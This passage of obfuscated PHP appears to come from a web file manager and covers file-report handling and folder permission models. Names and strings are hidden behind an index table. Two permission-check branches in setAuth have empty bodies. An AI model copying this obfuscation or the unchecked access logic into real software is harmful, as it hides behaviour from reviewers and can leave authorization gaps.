$²“ÃÃè— = Input::get($Ÿœ½Ü[467], $Ÿœ½Ü[17], $Ÿœ½Ü[2018], array($Ÿœ½Ü[1940], $Ÿœ½Ü[461])); $²“ÃÃè— = $ŠĞ‡ÅÊÇ[$²“ÃÃè—]; $ºø¶€€› = $ºø¶€€› . "{$§”¸“¾}\x20{$²“ÃÃè—}"; return $this->order($ºø¶€€›); } public function reportAdd($÷½íÄş) { $ÇàéÂËæ =& $_SERVER[¹Û¹Æ€]; $¦†Ô´ = array($ÇàéÂËæ[498] => $÷½íÄş[$ÇàéÂËæ[498]], $ÇàéÂËæ[1659] => USER_ID); if (Model($ÇàéÂËæ[2014])->where($¦†Ô´)->find()) { return !1; } $õéÄ™´Î = array($ÇàéÂËæ[498] => $÷½íÄş[$ÇàéÂËæ[498]], $ÇàéÂËæ[1559] => $÷½íÄş[$ÇàéÂËæ[1559]], $ÇàéÂËæ[411] => $÷½íÄş[$ÇàéÂËæ[411]], $ÇàéÂËæ[477] => $÷½íÄş[$ÇàéÂËæ[477]], $ÇàéÂËæ[1659] => USER_ID, $ÇàéÂËæ[43] => $÷½íÄş[$ÇàéÂËæ[43]], $ÇàéÂËæ[462] => $÷½íÄş[$ÇàéÂËæ[462]]); return Model($ÇàéÂËæ[2014])->add($õéÄ™´Î); } public function reportList($¿•Æ…„) { $èÇ½ÕĞü =& $_SERVER[¹Û¹Æ€]; $³¸Ëü = array(); if ($¿•Æ…„[$èÇ½ÕĞü[759]]) { $œ«° = $¿•Æ…„[$èÇ½ÕĞü[506]] ? $¿•Æ…„[$èÇ½ÕĞü[506]] : strtotime(date($èÇ½ÕĞü[2016])); $³¸Ëü[$èÇ½ÕĞü[210]] = array($èÇ½ÕĞü[342], array($¿•Æ…„[$èÇ½ÕĞü[759]], $œ«°)); } if (isset($¿•Æ…„[$èÇ½ÕĞü[43]]) && in_array($¿•Æ…„[$èÇ½ÕĞü[43]], array($èÇ½ÕĞü[98], $èÇ½ÕĞü[446], $èÇ½ÕĞü[2019], $èÇ½ÕĞü[2020], $èÇ½ÕĞü[2021]))) { $³¸Ëü[$èÇ½ÕĞü[43]] = $¿•Æ…„[$èÇ½ÕĞü[43]]; } if (isset($¿•Æ…„[$èÇ½ÕĞü[748]]) && in_array($¿•Æ…„[$èÇ½ÕĞü[748]], array($èÇ½ÕĞü[207], $èÇ½ÕĞü[98], $èÇ½ÕĞü[446], $èÇ½ÕĞü[2019]))) { $³¸Ëü[$èÇ½ÕĞü[748]] = $¿•Æ…„[$èÇ½ÕĞü[748]]; } $ÂüãÉäÒ = Input::get($èÇ½ÕĞü[467], $èÇ½ÕĞü[17], $èÇ½ÕĞü[2018], array($èÇ½ÕĞü[1940], $èÇ½ÕĞü[461])); $î”ŒÇÅ¨ = array($èÇ½ÕĞü[459] => $èÇ½ÕĞü[460], $èÇ½ÕĞü[461] => $èÇ½ÕĞü[462]); $Êªßò†Ò = $èÇ½ÕĞü[2022] . $î”ŒÇÅ¨[$ÂüãÉäÒ]; $˜Â½Œ» = Model($èÇ½ÕĞü[2014])->where($³¸Ëü)->order($Êªßò†Ò)->selectPage(20); if (empty($˜Â½Œ»[$èÇ½ÕĞü[378]])) { return array(); } $Ë…Â¦‹ = array_to_keyvalue_group($˜Â½Œ»[$èÇ½ÕĞü[378]], $èÇ½ÕĞü[748], $èÇ½ÕĞü[498]); if (!empty($Ë…Â¦‹[0])) { $¿•Æ…„ = $Ë…Â¦‹[0]; $³¸Ëü = array($èÇ½ÕĞü[498] => array($èÇ½ÕĞü[17], $¿•Æ…„)); $§‡´¿«¼ = $this->where($³¸Ëü)->field($èÇ½ÕĞü[498])->select(); $§‡´¿«¼ = array_to_keyvalue($§‡´¿«¼, $èÇ½ÕĞü[22], $èÇ½ÕĞü[498]); $«óÈÒÑä = array_diff($¿•Æ…„, $§‡´¿«¼); if (!empty($«óÈÒÑä)) { foreach ($˜Â½Œ»[$èÇ½ÕĞü[378]] as $ÓšÉó‰ˆ => $éì¡ùÂò) { if (in_array($éì¡ùÂò[$èÇ½ÕĞü[498]], $«óÈÒÑä)) { unset($˜Â½Œ»[$èÇ½ÕĞü[378]][$ÓšÉó‰ˆ]); } } } } $this->_listDataApply($˜Â½Œ»[$èÇ½ÕĞü[378]]); return $˜Â½Œ»; } public function reportStatus($¡†È¢Ô´) { $É×¯§¶‰ =& $_SERVER[¹Û¹Æ€]; $–›Š›Å = array($É×¯§¶‰[408] => $¡†È¢Ô´[$É×¯§¶‰[408]]); $È´¬ºô¹ = Model($É×¯§¶‰[2014])->where($–›Š›Å)->field($É×¯§¶‰[2023])->find(); if (!$È´¬ºô¹) { return !1; } $ú©™ºú” = array($É×¯§¶‰[748] => $¡†È¢Ô´[$É×¯§¶‰[748]]); if ($¡†È¢Ô´[$É×¯§¶‰[748]] == $É×¯§¶‰[2019] && $È´¬ºô¹[$É×¯§¶‰[748]] == $É×¯§¶‰[2019]) { $ú©™ºú”[$É×¯§¶‰[748]] = 0; } $°é‚‰ƒ = Model($É×¯§¶‰[2014])->where($–›Š›Å)->save($ú©™ºú”); if ($¡†È¢Ô´[$É×¯§¶‰[748]] == $É×¯§¶‰[446]) { if ($È´¬ºô¹[$É×¯§¶‰[477]] != $É×¯§¶‰[207] && $this->shareFileMeta($È´¬ºô¹[$É×¯§¶‰[477]])) { $this->shareFileMeta($È´¬ºô¹[$É×¯§¶‰[477]], 0); } $this->remove($È´¬ºô¹[$É×¯§¶‰[498]]); return !0; } if ($°é‚‰ƒ && $¡†È¢Ô´[$É×¯§¶‰[748]] == $É×¯§¶‰[2019]) { $ú…Š¢›  = $ú©™ºú”[$É×¯§¶‰[748]] == $É×¯§¶‰[2019] ? 1 : 0; $this->shareFileMeta($È´¬ºô¹[$É×¯§¶‰[477]], $ú…Š¢› ); $this->removeByFile($È´¬ºô¹[$É×¯§¶‰[477]]); } return $°é‚‰ƒ; } private function removeByFile($ûÁêÚ¸‘) { $Ë½ÙÎ˜ş =& $_SERVER[¹Û¹Æ€]; $¢İš¯ïü = Model($Ë½ÙÎ˜ş[823])->where(array($Ë½ÙÎ˜ş[477] => $ûÁêÚ¸‘))->field($Ë½ÙÎ˜ş[411])->select(); $§æêŸë = array_to_keyvalue($¢İš¯ïü, $Ë½ÙÎ˜ş[22], $Ë½ÙÎ˜ş[411]); $¤ÒšÆÏ— = array($Ë½ÙÎ˜ş[411] => array($Ë½ÙÎ˜ş[17], $§æêŸë), $Ë½ÙÎ˜ş[503] => 1); $¢İš¯ïü = $this->where($¤ÒšÆÏ—)->field($Ë½ÙÎ˜ş[498])->select(); if (empty($¢İš¯ïü)) { return; } $ûãîıÒÓ = array_to_keyvalue($¢İš¯ïü, $Ë½ÙÎ˜ş[22], $Ë½ÙÎ˜ş[498]); $this->remove($ûãîıÒÓ); } private function shareFileMeta($ƒÏ¤Æ¹”, $¡õÃš¯‡ = null) { $©¥ÓÂÍ™ =& $_SERVER[¹Û¹Æ€]; $¿ËãİÛ² = array($©¥ÓÂÍ™[477] => $ƒÏ¤Æ¹”, $©¥ÓÂÍ™[104] => $©¥ÓÂÍ™[2024]); if (is_null($¡õÃš¯‡)) { return Model($©¥ÓÂÍ™[2025])->where($¿ËãİÛ²)->find(); } $¿ËãİÛ²[$©¥ÓÂÍ™[383]] = $¡õÃš¯‡; Model($©¥ÓÂÍ™[2025])->add($¿ËãİÛ², array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\143\x65\137\x61\165\164\150"; public function getAuth($ĞùåÓõÕ) { $íòáÖ³ =& $_SERVER[¹Û¹Æ€]; $õÁ’ëÁõ = $this->sourceAuthSelect($ĞùåÓõÕ); $ß…Ô¸…ğ = array(); $ÁÖê¶±³ = array(); $Ï““§Ö = 2 << 25; foreach ($õÁ’ëÁõ as $½×±ë¿) { $ıÚÊ‘Ö¼ = Model($íòáÖ³[516])->listData($½×±ë¿[$íòáÖ³[1953]]); if (!$ıÚÊ‘Ö¼) { continue; } $ß…Ô¸…ğ[] = $½×±ë¿; $ÄıÛïè´ = 0; if ($½×±ë¿[$íòáÖ³[420]] == SourceModel::TYPE_GROUP) { $ÄıÛïè´ = $Ï““§Ö * 2; } if ($½×±ë¿[$íòáÖ³[420]] == SourceModel::TYPE_USER) { $ÄıÛïè´ = $Ï““§Ö; } if ($½×±ë¿[$íòáÖ³[420]] == SourceModel::TYPE_USER && $½×±ë¿[$íòáÖ³[514]] == $íòáÖ³[207]) { $ÄıÛïè´ = 0; } $ÁÖê¶±³[] = $ıÚÊ‘Ö¼[$íòáÖ³[422]] + $ÄıÛïè´; } array_multisort($ÁÖê¶±³, SORT_DESC, $ß…Ô¸…ğ); return $ß…Ô¸…ğ; } public function sourceAuthSelect($ÛÀ¿‹Ù¡) { $ú†§Åòò =& $_SERVER[¹Û¹Æ€]; static $¾»âÔ…ı = array(); $Æü¼¯«¸ = is_array($ÛÀ¿‹Ù¡) ? !1 : !0; if ($Æü¼¯«¸) { $ÛÀ¿‹Ù¡ = array($ÛÀ¿‹Ù¡); } $éøƒÂ¹§ = array(); foreach ($ÛÀ¿‹Ù¡ as $ïèıé‚) { if (isset($¾»âÔ…ı[$ïèıé‚])) { $éøƒÂ¹§[$ïèıé‚] = $¾»âÔ…ı[$ïèıé‚]; } } if (count($éøƒÂ¹§) == count($ÛÀ¿‹Ù¡)) { return $Æü¼¯«¸ ? $éøƒÂ¹§[$ÛÀ¿‹Ù¡[0]] : $éøƒÂ¹§; } $Ó°¥Æ¿è = $ú†§Åòò[2026]; $¤™ÊõĞ— = array($ú†§Åòò[411] => array($ú†§Åòò[17], $ÛÀ¿‹Ù¡)); $üºÌ  = $this->field($Ó°¥Æ¿è)->order($ú†§Åòò[408])->where($¤™ÊõĞ—)->select(); $œÅÓŠ¸ = array_to_keyvalue_group($üºÌ , $ú†§Åòò[411]); foreach ($ÛÀ¿‹Ù¡ as $ïèıé‚) { $¾»âÔ…ı[$ïèıé‚] = $œÅÓŠ¸[$ïèıé‚] ? $œÅÓŠ¸[$ïèıé‚] : array(); } if ($Æü¼¯«¸) { return $üºÌ ; } return $œÅÓŠ¸; } public function setAuth($‡ªµí«, $ÄØıĞ•ˆ) { $Ü¯ÏàÂ· =& $_SERVER[¹Û¹Æ€]; $±ï¨±åò = Model($Ü¯ÏàÂ·[1333])->sourceInfo($‡ªµí«); if (!$±ï¨±åò) { return !1; } if ($±ï¨±åò[$Ü¯ÏàÂ·[420]] != SourceModel::TYPE_GROUP) { return !1; } $íƒûÄÉ× = 1; $Æ™À‹÷Ò = $±ï¨±åò[$Ü¯ÏàÂ·[514]]; if ($Æ™À‹÷Ò != $íƒûÄÉ×) { $¯êìÜøÚ = array($Ü¯ÏàÂ·[1849] => $Æ™À‹÷Ò); $›³Şè±ß = Model($Ü¯ÏàÂ·[1939])->field($Ü¯ÏàÂ·[1659])->where($¯êìÜøÚ)->select(); $›³Şè±ß = array_to_keyvalue($›³Şè±ß, $Ü¯ÏàÂ·[22], $Ü¯ÏàÂ·[1659]); } $…ü‹ŠÂ“ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $«Ûğï‘à = array(); foreach ($ÄØıĞ•ˆ as $»ÙóÅú) { if (!in_array($»ÙóÅú[$Ü¯ÏàÂ·[420]], $…ü‹ŠÂ“)) { show_json(LNG($Ü¯ÏàÂ·[2027]), !1); } if ($Æ™À‹÷Ò != $íƒûÄÉ×) { if ($»ÙóÅú[$Ü¯ÏàÂ·[420]] == SourceModel::TYPE_GROUP) { } if ($»ÙóÅú[$Ü¯ÏàÂ·[514]] != 0 && !in_array($»ÙóÅú[$Ü¯ÏàÂ·[514]], $›³Şè±ß)) { } } if ($»ÙóÅú[$Ü¯ÏàÂ·[514]] == 0) { $»ÙóÅú[$Ü¯ÏàÂ·[420]] = SourceModel::TYPE_USER; } $«Ûğï‘à[] = array($Ü¯ÏàÂ·[411] => $‡ªµí«, $Ü¯ÏàÂ·[420] => intval($»ÙóÅú[$Ü¯ÏàÂ·[420]]), $Ü¯ÏàÂ·[514] => intval($»ÙóÅú[$Ü¯ÏàÂ·[514]]), $Ü¯ÏàÂ·[1953] => intval($»ÙóÅú[$Ü¯ÏàÂ·[1953]]) ? intval($»ÙóÅú[$Ü¯ÏàÂ·[1953]]) : 0, $Ü¯ÏàÂ·[2009] => intval($»ÙóÅú[$Ü¯ÏàÂ·[2009]]) ? intval($»ÙóÅú[$Ü¯ÏàÂ·[2009]]) : -1); } $this->where(array($Ü¯ÏàÂ·[426] => $‡ªµí«))->delete(); $this->addAll($«Ûğï‘à); return !0; } public function authClear($¹™ïïø…) { $„…„›ÈÓ =& $_SERVER[¹Û¹Æ€]; $ßÙü¦€² = Model($„…„›ÈÓ[1333])->sourceInfo($¹™ïïø…); $ŸÚ©û¡ = array($¹™ïïø…); if ($ßÙü¦€²[$„…„›ÈÓ[419]] == $„…„›ÈÓ[98]) { $ã‰‡âæ– = array($„…„›ÈÓ[599] => array($„…„›ÈÓ[559], $ßÙü¦€²[$„…„›ÈÓ[530]] . $¹™ïïø… . $„…„›ÈÓ[560])); $ŸÚ©û¡ = Model($„…„›ÈÓ[1333])->field($„…„›ÈÓ[426])->where($ã‰‡âæ–)->getField($„…„›ÈÓ[411], !0); $ŸÚ©û¡[] = $¹™ïïø…; } $this->where(array($„…„›ÈÓ[426] => array($„…„›ÈÓ[427], $ŸÚ©û¡)))->delete(); return !0; } public function getAllChildren($‡»‹§‹ê) { $ƒµÌå÷¡ =& $_SERVER[¹Û¹Æ€]; $Ïôá˜ãš = Model($ƒµÌå÷¡[1333])->sourceInfo($‡»‹§‹ê); if ($Ïôá˜ãš[$ƒµÌå÷¡[419]] != $ƒµÌå÷¡[98]) { return $this->sourceListAuth(array($‡»‹§‹ê)); } if ($Ïôá˜ãš[$ƒµÌå÷¡[420]] != SourceModel::TYPE_GROUP) { return array(); } $ÚÕ­ëèæ = 1; $ùøó–¡— = array($‡»‹§‹ê); if ($Ïôá˜ãš[$ƒµÌå÷¡[441]] == $ƒµÌå÷¡[207] && $Ïôá˜ãš[$ƒµÌå÷¡[514]] != $ÚÕ­ëèæ) { $ùøó–¡— = $this->groupChidldAllRootSource($Ïôá˜ãš[$ƒµÌå÷¡[514]]); } $èØàëÒ = $this->field($ƒµÌå÷¡[411])->group($ƒµÌå÷¡[411])->select(); $èØàëÒ = array_to_keyvalue($èØàëÒ, $ƒµÌå÷¡[22], $ƒµÌå÷¡[411]); if (!$èØàëÒ) { return array(); } $ñìÅ®²— = $ƒµÌå÷¡[2028]; $í¼â—ß‰ = array($ƒµÌå÷¡[411] => array($ƒµÌå÷¡[17], $èØàëÒ), $ƒµÌå÷¡[440] => $ƒµÌå÷¡[207]); $„íÑšÒÀ = Model($ƒµÌå÷¡[823])->field($ñìÅ®²—)->where($í¼â—ß‰)->select(); $Ü·‰í¥ù = array($‡»‹§‹ê); foreach ($„íÑšÒÀ as $ù›“¹Ş) { foreach ($ùøó–¡— as $Ùùì™ò¦) { $³‘®èù = $ƒµÌå÷¡[60] . $Ùùì™ò¦ . $ƒµÌå÷¡[60]; $¸‡á­´­ = $ù›“¹Ş[$ƒµÌå÷¡[530]] . $ù›“¹Ş[$ƒµÌå÷¡[411]] . $ƒµÌå÷¡[60]; if (strstr($¸‡á­´­, $³‘®èù)) { $Ü·‰í¥ù[] = $ù›“¹Ş[$ƒµÌå÷¡[411]]; break; } } } return $this->sourceListAuth($Ü·‰í¥ù); } private function sourceListAuth($¿Çï§†) { $ü›æÂ£Š =& $_SERVER[¹Û¹Æ€]; $Æğ‚¢È™ = Model($ü›æÂ£Š[1333])->sourceListInfo($¿Çï§†, !0); $ïüªù¿¯ = $this->sourceAuthSelect($¿Çï§†); $¶·ıüô = array(); $ÀŒ±˜õİ = array(); foreach ($Æğ‚¢È™ as $È¬¼™¦) { unset($È¬¼™¦[$ü›æÂ£Š[465]]); unset($È¬¼™¦[$ü›æÂ£Š[463]]); unset($È¬¼™¦[$ü›æÂ£Š[422]]); unset($È¬¼™¦[$ü›æÂ£Š[96]]); $×•æ‘¡§ = $ïüªù¿¯[$È¬¼™¦[$ü›æÂ£Š[411]]]; if (!$×•æ‘¡§) { continue; } $È¬¼™¦[$ü›æÂ£Š[2029]] = $this->authTargetInfo($×•æ‘¡§); $È¬¼™¦[$ü›æÂ£Š[528]] = rtrim($È¬¼™¦[$ü›æÂ£Š[534]], $ü›æÂ£Š[18]) . $ü›æÂ£Š[18] . ltrim($È¬¼™¦[$ü›æÂ£Š[528]], $ü›æÂ£Š[18]); $¶·ıüô[] = $È¬¼™¦; $”úâÊ© = count(explode($ü›æÂ£Š[18], trim($È¬¼™¦[$ü›æÂ£Š[528]], $ü›æÂ£Š[18]))); $ÀŒ±˜õİ[] = $”úâÊ© + ($È¬¼™¦[$ü›æÂ£Š[43]] == $ü›æÂ£Š[85] ? 0 : 1000); } array_multisort($ÀŒ±˜õİ, SORT_ASC, $¶·ıüô); return $¶·ıüô; } private function groupChidldAllRootSource($òŠ‚è‹Ç) { $¢÷şºË³ =& $_SERVER[¹Û¹Æ€]; $”¹ÚŒü· = Model($¢÷şºË³[2030])->groupChildrenAll($òŠ‚è‹Ç); $Àüé•ˆŒ = array($¢÷şºË³[441] => 0, $¢÷şºË³[514] => array($¢÷şºË³[17], $”¹ÚŒü·), $¢÷şºË³[420] => SourceModel::TYPE_GROUP); $…¯‰Ÿí = Model($¢÷şºË³[823])->field($¢÷şºË³[411])->where($Àüé•ˆŒ)->select(); $…¯‰Ÿí = array_to_keyvalue($…¯‰Ÿí, $¢÷şºË³[22], $¢÷şºË³[411]); return $…¯‰Ÿí; } private function authTargetInfo($¼çÆ¨ùŠ) { $î£ì×ŒÉ =& $_SERVER[¹Û¹Æ€]; $ÌùãÉõ½ = array(); $šàµÄÑŸ = array(); $Ş„ĞÂ¤• = 2 << 25; foreach ($¼çÆ¨ùŠ as $òåª°òí) { $¿¨®Æğ = Model($î£ì×ŒÉ[516])->listData($òåª°òí[$î£ì×ŒÉ[1953]]); if (!$¿¨®Æğ) { continue; } if ($òåª°òí[$î£ì×ŒÉ[420]] == SourceModel::TYPE_USER) { $Œêš¾Àç = Model($î£ì×ŒÉ[522])->getInfoSimpleOuter($òåª°òí[$î£ì×ŒÉ[514]]); if ($Œêš¾Àç[$î£ì×ŒÉ[1659]] == $î£ì×ŒÉ[1186]) { continue; } if ($Œêš¾Àç[$î£ì×ŒÉ[1659]] == $î£ì×ŒÉ[207]) { $Œêš¾Àç[$î£ì×ŒÉ[42]] = LNG($î£ì×ŒÉ[2031]); } } else { $Œêš¾Àç = Model($î£ì×ŒÉ[531])->getInfoSimple($òåª°òí[$î£ì×ŒÉ[514]]); } if (!$Œêš¾Àç) { continue; } $Œêš¾Àç[$î£ì×ŒÉ[476]] = $¿¨®Æğ; $ÌùãÉõ½[] = $Œêš¾Àç; $†ÉË”·“ = 0; if ($òåª°òí[$î£ì×ŒÉ[420]] == SourceModel::TYPE_GROUP) { $†ÉË”·“ = $Ş„ĞÂ¤• * 2; } if ($òåª°òí[$î£ì×ŒÉ[420]] == SourceModel::TYPE_USER) { $†ÉË”·“ = $Ş„ĞÂ¤•; } if ($òåª°òí[$î£ì×ŒÉ[420]] == SourceModel::TYPE_USER && $òåª°òí[$î£ì×ŒÉ[514]] == $î£ì×ŒÉ[207]) { $†ÉË”·“ = 0; } $šàµÄÑŸ[] = $¿¨®Æğ[$î£ì×ŒÉ[422]] + $†ÉË”·“; } array_multisort($šàµÄÑŸ, SORT_DESC, $ÌùãÉõ½); return $ÌùãÉõ½; } public function getAllChildrenByUser($ªÎã‹‹, $Š¡‰¢•ì) { $¹â¥Ù¥Ã =& $_SERVER[¹Û¹Æ€]; $˜ÓéÚ± = Model($¹â¥Ù¥Ã[544])->getInfo($Š¡‰¢•ì); if (!$Š¡‰¢•ì || !$ªÎã‹‹ || !$˜ÓéÚ±) { return array(); } $ş”˜Æ¬Ô = Model($¹â¥Ù¥Ã[1333])->sourceInfo($ªÎã‹‹); $À¢È›·ı = array(); $ìŠ¼Ô¥† = 1; if ($ş”˜Æ¬Ô[$¹â¥Ù¥Ã[441]] == $¹â¥Ù¥Ã[207] && $ş”˜Æ¬Ô[$¹â¥Ù¥Ã[514]] != $ìŠ¼Ô¥† && $this->groupContainUser($ş”˜Æ¬Ô[$¹â¥Ù¥Ã[514]], $Š¡‰¢•ì)) { foreach ($˜ÓéÚ±[$¹â¥Ù¥Ã[2032]] as $«æÒ½®) { $²Ùµ›¼ë = Model($¹â¥Ù¥Ã[531])->getInfo($«æÒ½®[$¹â¥Ù¥Ã[1849]]); $ÊÃéºÖ¨ = Model($¹â¥Ù¥Ã[544])->getInfoSimpleOuter($Š¡‰¢•ì); $ÊÃéºÖ¨[$¹â¥Ù¥Ã[476]] = $«æÒ½®[$¹â¥Ù¥Ã[422]]; if (Model($¹â¥Ù¥Ã[516])->authCheckAction($«æÒ½®[$¹â¥Ù¥Ã[422]][$¹â¥Ù¥Ã[422]], $¹â¥Ù¥Ã[1870])) { continue; } $¶Î™Î¢˜ = array($¹â¥Ù¥Ã[42] => $¹â¥Ù¥Ã[1206] . $²Ùµ›¼ë[$¹â¥Ù¥Ã[42]], $¹â¥Ù¥Ã[411] => $²Ùµ›¼ë[$¹â¥Ù¥Ã[96]][$¹â¥Ù¥Ã[411]], $¹â¥Ù¥Ã[94] => KodIO::make($²Ùµ›¼ë[$¹â¥Ù¥Ã[96]][$¹â¥Ù¥Ã[411]]), $¹â¥Ù¥Ã[441] => $¹â¥Ù¥Ã[207], $¹â¥Ù¥Ã[420] => $¹â¥Ù¥Ã[524], $¹â¥Ù¥Ã[43] => $¹â¥Ù¥Ã[563], $¹â¥Ù¥Ã[528] => $²Ùµ›¼ë[$¹â¥Ù¥Ã[535]], $¹â¥Ù¥Ã[1849] => $²Ùµ›¼ë[$¹â¥Ù¥Ã[1849]], $¹â¥Ù¥Ã[532] => $²Ùµ›¼ë[$¹â¥Ù¥Ã[441]], $¹â¥Ù¥Ã[2029] => array($ÊÃéºÖ¨)); $À¢È›·ı[$¶Î™Î¢˜[$¹â¥Ù¥Ã[411]]] = $¶Î™Î¢˜; } } $ŠôœÆƒè = array(); $æä¹“Ç = $this->getAllChildren($ªÎã‹‹); foreach ($æä¹“Ç as $Ö¼Õ”û¹) { $ãÉÊ…Ï = !1; foreach ($Ö¼Õ”û¹[$¹â¥Ù¥Ã[2029]] as $¡°‚²Ã¡) { if ($¡°‚²Ã¡[$¹â¥Ù¥Ã[1659]]) { if ($¡°‚²Ã¡[$¹â¥Ù¥Ã[1659]] == $Š¡‰¢•ì) { $ãÉÊ…Ï = !0; break; } } if ($¡°‚²Ã¡[$¹â¥Ù¥Ã[1849]]) { if ($this->groupContainUser($¡°‚²Ã¡[$¹â¥Ù¥Ã[1849]], $Š¡‰¢•ì)) { $ãÉÊ…Ï = !0; break; } } } if ($ãÉÊ…Ï) { $ŠôœÆƒè[] = $Ö¼Õ”û¹; } $½Ê¬÷“¼ = $Ö¼Õ”û¹[$¹â¥Ù¥Ã[411]]; if (isset($À¢È›·ı[$½Ê¬÷“¼])) { $Ö¼Õ”û¹[$¹â¥Ù¥Ã[2029]][] = $À¢È›·ı[$½Ê¬÷“¼][0]; $À¢È›·ı[$½Ê¬÷“¼] = !1; } } $À¢È›·ı = array_filter(array_values($À¢È›·ı)); $ŠôœÆƒè = array_merge($À¢È›·ı, $ŠôœÆƒè); return $ŠôœÆƒè; } public function setAllChildrenByUser($¬¿­¶¹ª, $ÈÕÅçèÌ, $¤·ÚÔ†€) { $•Ÿü«´ =& $_SERVER[¹Û¹Æ€]; $“úÃ¹²ı = $this->getAllChildrenByUser($¬¿­¶¹ª, $ÈÕÅçèÌ); if (!$¤·ÚÔ†€ || !$“úÃ¹²ı) { return !1; } foreach ($“úÃ¹²ı as $¥É«–ŸÅ) { $¢Û‰ÔÓ = array(); foreach ($¥É«–ŸÅ[$•Ÿü«´[2029]] as $Ò§«¤ä–) { $Ÿ‘¦‰‹€ = $Ò§«¤ä–[$•Ÿü«´[476]]; $ŞÔ…Ş´ = $Ò§«¤ä–[$•Ÿü«´[1659]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $’’Î»¸‡ = $Ò§«¤ä–[$•Ÿü«´[1659]] ? $Ò§«¤ä–[$•Ÿü«´[1659]] : $Ò§«¤ä–[$•Ÿü«´[1849]]; if ($Ò§«¤ä–[$•Ÿü«´[1659]] && $Ò§«¤ä–[$•Ÿü«´[1659]] == $ÈÕÅçèÌ) { continue; } $¢Û‰ÔÓ[] = array($•Ÿü«´[411] => $¥É«–ŸÅ[$•Ÿü«´[411]], $•Ÿü«´[420] => $ŞÔ…Ş´, $•Ÿü«´[514] => intval($’’Î»¸‡), $•Ÿü«´[1953] => isset($Ÿ‘¦‰‹€[$•Ÿü«´[408]]) ? intval($Ÿ‘¦‰‹€[$•Ÿü«´[408]]) : 0, $•Ÿü«´[2009] => isset($Ÿ‘¦‰‹€[$•Ÿü«´[2009]]) ? intval($Ÿ‘¦‰‹€[$•Ÿü«´[2009]]) : -1); } $¢Û‰ÔÓ[] = array($•Ÿü«´[411] => $¥É«–ŸÅ[$•Ÿü«´[411]], $•Ÿü«´[420] => SourceModel::TYPE_USER, $•Ÿü«´[514] => intval($ÈÕÅçèÌ), $•Ÿü«´[1953] => intval($¤·ÚÔ†€), $•Ÿü«´[2009] => -1); $this->where(array($•Ÿü«´[426] => $¥É«–ŸÅ[$•Ÿü«´[411]]))->delete(); $this->addAll($¢Û‰ÔÓ); } return !0; } public function get($„å„¹“) { $¬ÄºŒ¸õ = $this->getSourceList(array($„å„¹“), !0); return $¬ÄºŒ¸õ[0]; } public function getSourceList($ŸñÆÕ, $£ì­Šñ° = false, $çÒ‚ù²å = false) { $¥Ş¤¼¥ê =& $_SERVER[¹Û¹Æ€]; if (!$ŸñÆÕ) { return array(); } $„À—öâÌ = Model($¥Ş¤¼¥ê[1333]); if (!$£ì­Šñ° && count($ŸñÆÕ) == 1) { $£ì­Šñ° = array(); $£ì­Šñ°[$ŸñÆÕ[0]] = $„À—öâÌ->sourceInfo($ŸñÆÕ[0]); } if (!$£ì­Šñ°) { $íÈÅêóƒ = array($¥Ş¤¼¥ê[426] => array($¥Ş¤¼¥ê[427], $ŸñÆÕ)); $£ì­Šñ° = $„À—öâÌ->field($¥Ş¤¼¥ê[2033])->where($íÈÅêóƒ)->select(); $£ì­Šñ° = array_to_keyvalue($£ì­Šñ°, $¥Ş¤¼¥ê[411]); } $ÒÑ’ı—ˆ = $ŸñÆÕ; foreach ($£ì­Šñ° as $çóöÙÄå => $©éØ³í‰) { $¼ö–çÜ— = $„À—öâÌ->parentLevelArray($©éØ³í‰[$¥Ş¤¼¥ê[530]]); $ÒÑ’ı—ˆ = array_merge($ÒÑ’ı—ˆ, array($çóöÙÄå), array_reverse($¼ö–çÜ—)); } $ÒÑ’ı—ˆ = array_values(array_unique($ÒÑ’ı—ˆ)); if (!$ÒÑ’ı—ˆ) { return array(); } $à¥ÆìöÕ = $this->sourceAuthSelect($ÒÑ’ı—ˆ); $»ĞûÖıÔ = array(); foreach ($ÒÑ’ı—ˆ as $¼ßš‡˜«) { if (isset($à¥ÆìöÕ[$¼ßš‡˜«])) { $»ĞûÖıÔ[$¼ßš‡˜«] = $à¥ÆìöÕ[$¼ßš‡˜«]; } } $›œößãş = $this->userIsRoot($çÒ‚ù²å); $©îìé¬£ = AuthModel::authAll(); $±•ƒ‚ç = array($¥Ş¤¼¥ê[423] => $©îìé¬£, $¥Ş¤¼¥ê[2034] => array($¥Ş¤¼¥ê[428] => 0, $¥Ş¤¼¥ê[1855] => $©îìé¬£, $¥Ş¤¼¥ê[429] => LNG($¥Ş¤¼¥ê[2035]), $¥Ş¤¼¥ê[1872] => $¥Ş¤¼¥ê[2036])); $–˜Ê™¡Œ = array(); foreach ($£ì­Šñ° as $¼ßš‡˜« => $Òã„§) { if ($›œößãş && $GLOBALS[$¥Ş¤¼¥ê[16]][$¥Ş¤¼¥ê[1868]]) { $–˜Ê™¡Œ[$¼ßš‡˜«] = $±•ƒ‚ç; continue; } $–˜Ê™¡Œ[$¼ßš‡˜«] = $this->makeSourceAuth($Òã„§, $»ĞûÖıÔ, $çÒ‚ù²å); } return $–˜Ê™¡Œ; } public function authDeepCheck($Û¦åì , $Õ…µõµ© = false) { $¯ô†—áù =& $_SERVER[¹Û¹Æ€]; $Õ…µõµ© = $Õ…µõµ© ? $Õ…µõµ© : USER_ID; $…„œƒä‹ = $this->makeAuthDeep($Õ…µõµ©); if (!in_array($Û¦åì , $…„œƒä‹[$¯ô†—áù[2037]])) { return !1; } $Òá„®Íğ = array(); foreach ($…„œƒä‹[$¯ô†—áù[2038]] as $Ğˆ““¯Ï => $Üˆ˜¢¶) { if (!in_array($Û¦åì , $Üˆ˜¢¶)) { continue; } $Òá„®Íğ[] = $Ğˆ““¯Ï; } if (!$Òá„®Íğ) { return !1; } $¬£çİª­ = $Òá„®Íğ ? $Òá„®Íğ[0] : $Û¦åì ; return array($¯ô†—áù[423] => -1, $¯ô†—áù[476] => array($¯ô†—áù[428] => $¯ô†—áù[1186], $¯ô†—áù[1855] => $¯ô†—áù[207], $¯ô†—áù[429] => LNG($¯ô†—áù[2039]), $¯ô†—áù[1872] => $¯ô†—áù[2040]), $¯ô†—áù[2041] => LNG($¯ô†—áù[2042]), $¯ô†—áù[2043] => $this->sourceAuthInfo($¬£çİª­)); } protected function makeAuthDeep($¬öÃİ› = false) { $éêŞì¦Ş =& $_SERVER[¹Û¹Æ€]; static $¹Ğú¾ç© = array(); $¬öÃİ› = $¬öÃİ› ? $¬öÃİ› : 